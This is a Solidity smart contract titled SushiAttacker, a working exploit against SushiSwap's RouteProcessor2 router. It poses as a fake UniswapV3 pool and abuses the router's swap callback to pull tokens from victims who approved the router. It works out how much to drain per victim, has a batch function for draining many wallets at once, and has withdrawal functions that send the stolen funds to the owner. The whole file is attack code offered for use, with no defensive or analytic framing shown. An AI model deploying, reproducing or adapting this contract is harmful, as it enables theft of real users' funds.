// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IERC20} from "../common/IERC20.sol";
import {IRouteProcessor2} from "./interfaces/IRouteProcessor2.sol";

/**
 * @title SushiAttacker
 * @notice Single contract to exploit RouteProcessor2 vulnerability
 * @dev Combines fake pool + exploit logic in one deployable contract
 */
contract SushiAttacker {
    /// ============ Immutable Storage ============
    address public immutable owner;
    IRouteProcessor2 public immutable router;

    /// ============ Mutable Storage ============

    // Swap params set during exploit() call
    int256 private tokenAmount;
    address private token;
    address private victim;

    // Malicious route payload (encodes this contract as "pool")
    bytes private payload;
    address private placeholderToken = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    /// ============ Constructor ============

    constructor(address _router) {
        owner = msg.sender;
        router = IRouteProcessor2(_router);

        // Pre-build payload: encodes this contract as fake UniV3 pool
        payload = abi.encodePacked(
            uint8(1), // Command: UniswapV3 swap
            placeholderToken, // Placeholder token
            uint8(1), // Num pools
            uint16(0), // Share
            uint8(1), // Pool type (UniV3)
            address(this), // Pool address = THIS CONTRACT
            false, // zeroForOne
            address(0) // Recipient
        );
    }

    /// ============ Exploit Functions ============

    /**
     * @notice Execute exploit against a victim who approved router
     * @param _token Address of token to exploit
     * @param _victim Address to drain (must have approved router)
     */
    function exploit(address _token, address _victim) external {
        require(msg.sender == owner, "Not owner");

        // Auto-detect victim's balance
        uint256 balance = IERC20(_token).balanceOf(_victim);

        // Auto-detect approval amount
        uint256 approved = IERC20(_token).allowance(_victim, address(router));

        // Drain minimum of balance and approved amount
        uint256 drainAmount = balance <= approved ? balance : approved;
        // Store exploit params for callback
        tokenAmount = int256(drainAmount);
        token = _token;
        victim = _victim;

        // Call router with malicious payload
        router.processRoute(
            token, // tokenIn
            0, // amountIn=0
            token, // tokenOut
            0, // amountOut
            address(this), // to
            payload // Malicious route
        );
    }

    /**
     * @notice Batch exploit multiple victims (auto-detect balances)
     * @param _token Token to steal
     * @param _victims Array of victim addresses
     */
    function batchExploit(address _token, address[] calldata _victims) external {
        require(msg.sender == owner, "Not owner");

        for (uint256 i = 0; i < _victims.length; i++) {
            // Auto-detect victim's balance
            uint256 balance = IERC20(_token).balanceOf(_victims[i]);

            // Auto-detect approval amount
            uint256 approved = IERC20(_token).allowance(_victims[i], address(router));

            // Drain minimum of balance and approved amount
            uint256 drainAmount = balance <= approved ? balance : approved;

            if (drainAmount > 0) {
                tokenAmount = int256(drainAmount);
                token = _token;
                victim = _victims[i];

                router.processRoute(token, 0, token, 0, address(this), payload);
            }
        }
    }

    /// ============ Fake Pool Callbacks ============

    /**
     * @notice Fake UniswapV3 pool swap function
     * @dev Called by router during processRoute()
     * Router thinks this is a real pool and calls our swap()
     */
    function swap(address, bool, int256, uint160, bytes calldata) external returns (int256 amount0, int256 amount1) {
        // Call back to router's vulnerable callback
        // Router will execute: token.safeTransferFrom(victim, this, tokenAmount)
        router.uniswapV3SwapCallback(
            tokenAmount, // amount0Delta (what router will transfer)
            0, // amount1Delta
            abi.encode(token, victim) // Data: which token + who to drain
        );

        return (tokenAmount, 0);
    }

    /// ============ Withdrawal Functions ============

    /**
     * @notice Withdraw stolen tokens to owner
     * @param _token Token to withdraw
     */
    function withdraw(address _token) external {
        require(msg.sender == owner, "Not owner");
        uint256 balance = IERC20(_token).balanceOf(address(this));
        IERC20(_token).transfer(owner, balance);
    }

    /**
     * @notice Approve owner to spend tokens (alternative withdrawal)
     * @param _token Token to approve
     * @param _amount Amount to approve
     */
    function approve(address _token, uint256 _amount) external {
        require(msg.sender == owner, "Not owner");
        IERC20(_token).approve(owner, _amount);
    }

    /// ============ View Functions ============

    function getStolenBalance(address _token) external view returns (uint256) {
        return IERC20(_token).balanceOf(address(this));
    }
}
